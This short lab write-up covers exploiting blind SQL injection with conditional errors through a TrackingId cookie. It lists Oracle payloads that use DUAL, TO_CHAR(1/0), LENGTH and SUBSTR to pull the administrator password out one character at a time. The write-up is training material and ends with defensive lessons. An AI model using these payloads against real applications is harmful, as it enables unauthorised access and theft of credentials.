# Lab Name
Blind SQL injection with conditional errors.

## Vulnerability
Blind SQL Injection 

## Objective
Demonstrate exploitation of blind SQL injection using conditional error-based inference to extract administrator credentials.

## Entry Point
TrackingId cookie parameter was vulnerable to SQL injection.

## Payload Used
-	'||(SELECT NULL FROM dual)||'
-	'||(SELECT NULL FROM users WHERE username='administrator')||'
-	'||(SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' END FROM dual )||'
-	'||(SELECT CASE WHEN LENGTH (password)= 1 THEN TO_CHAR (1/0) ELSE '' END FROM users WHERE username= 'administrator' )||'
-	'||(SELECT CASE WHEN SUBSTR (password,1,1)= 'a' THEN TO_CHAR (1/0) ELSE '' END FROM users WHERE username= 'administrator' )||'
 
## Result
Successfully extracted the administrator password and authenticated as administrator.

## Learning
- Blind SQL Injection does not display data directly; attacker must infer results from application behavior.
- Conditional error technique forces the database to throw an error when a condition is true.
- Oracle-specific features like DUAL table and TO_CHAR(1/0) can be used to trigger controlled errors.
- Data extraction is performed character-by-character using SUBSTR() and LENGTH().
- Proper understanding of query structure and context is critical to avoid syntax errors.
- Even when error messages are hidden, behavior-based inference allows full data extraction.
- Input validation and parameterized queries are essential to prevent SQL injection.
